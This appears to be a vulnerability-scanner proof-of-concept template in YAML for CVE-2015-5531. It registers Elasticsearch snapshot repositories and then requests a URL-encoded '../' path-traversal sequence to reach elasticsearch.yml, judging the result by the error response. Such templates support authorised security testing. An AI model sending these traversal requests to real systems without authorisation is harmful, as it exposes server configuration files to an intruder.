detail:
  author: ha9worm(https://github.com/ha9worm)
  links:
  - https://www.cnblogs.com/sallyzhang/p/12457031.html
expression: r0() && r1() && r2()
manual: true
name: poc-yaml-elasticsearch-cve-2015-5531
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("application/json")
      && response.body.bcontains(b"{\"acknowledged\":true}")
    request:
      body: "{\n    \"type\": \"fs\",\n    \"settings\":{\n        \"location\": \"\
        /usr/share/elasticsearch/repo/{{r1}}\"\n    }\n}"
      cache: true
      follow_redirects: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: PUT
      path: /_snapshot/{{r1}}
  r1:
    expression: response.status == 200 && response.content_type.contains("application/json")
      && response.body.bcontains(b"{\"acknowledged\":true}")
    request:
      body: "{\n    \"type\": \"fs\",\n    \"settings\":{\n        \"location\": \"\
        /usr/share/elasticsearch/repo/{{r1}}/snapshot-backdata\"\n    }\n}"
      cache: true
      follow_redirects: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: PUT
      path: /_snapshot/{{r1}}2
  r2:
    expression: response.status == 400 && response.content_type.contains("application/json")
      && response.body.bcontains(b"{\"error\":\"ElasticsearchParseException[Failed
      to derive xcontent from")
    request:
      cache: true
      follow_redirects: true
      method: GET
      path: /_snapshot/{{r1}}/backdata%2f..%2f..%2f..%2fconfig%2felasticsearch.yml
set:
  r1: randomLowercase(4)
transport: http
